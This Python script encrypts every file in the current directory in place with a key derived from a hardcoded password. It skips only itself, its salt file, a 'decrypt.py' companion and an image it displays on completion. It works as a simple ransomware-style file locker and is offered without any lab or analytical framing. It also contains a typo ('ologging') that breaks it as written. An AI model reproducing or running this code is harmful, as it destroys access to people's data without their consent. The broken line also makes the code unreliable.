#!/usr/bin/env python3

import os
import base64
import platform
import subprocess
import logging
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.fernet import Fernet

# Configure logging for debugging
ologging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')

# Log environment details
logging.info(f"Running on platform: {platform.system()} {platform.release()}")
logging.info(f"Current working directory: {os.getcwd()}")

# Password to use for encryption (bytes)
password = b"Skendings@2303"

# Salt file path (to reuse salt for consistent key)
salt_file = "thekey.key"

# Load or generate salt
if os.path.exists(salt_file):
    logging.info(f"Loading existing salt from {salt_file}")
    with open(salt_file, "rb") as sf:
        salt = sf.read()
else:
    salt = os.urandom(16)
    with open(salt_file, "wb") as sf:
        sf.write(salt)
    logging.info(f"Generated new salt and saved to {salt_file}")

# Derive the encryption key from the password using PBKDF2
kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=100_000,
    backend=default_backend()
)
key = base64.urlsafe_b64encode(kdf.derive(password))
logging.info("Derived encryption key from password and salt")

# Files to skip during encryption
script_name = os.path.basename(__file__)
skip = {script_name, salt_file, "decrypt.py", "Echoflux.png"}
logging.info(f"Skipping files: {skip}")

# Collect target files
files = [f for f in os.listdir() if os.path.isfile(f) and f not in skip]
logging.info(f"Files to encrypt: {files}")

# Initialize Fernet
fernet = Fernet(key)

def encrypt_files():
    encrypted_count = 0
    for filename in files:
        try:
            with open(filename, "rb") as infile:
                data = infile.read()
            encrypted = fernet.encrypt(data)
            with open(filename, "wb") as outfile:
                outfile.write(encrypted)
            logging.info(f"Encrypted {filename}")
            encrypted_count += 1
        except Exception as e:
            logging.error(f"Failed to encrypt {filename}: {e}")

    if encrypted_count == 0:
        logging.warning("No files were encrypted. Check skip list, file permissions, and working directory.")
    else:
        logging.info(f"Successfully encrypted {encrypted_count} file(s)")

# Function to display completion image
def display_image(path: str):
    try:
        os.startfile(path)
        logging.info(f"Displayed image: {path}")
    except Exception as e:
        logging.error(f"Failed to display image {path}: {e}")

def main():
    encrypt_files()
    img_path = os.path.join(os.getcwd(), "Echoflux.png")
    if os.path.exists(img_path):
        logging.info(f"Displaying completion image {img_path}")
        display_image(img_path)
    else:
        logging.warning(f"Image not found: {img_path}")

if __name__ == "__main__":
    main()

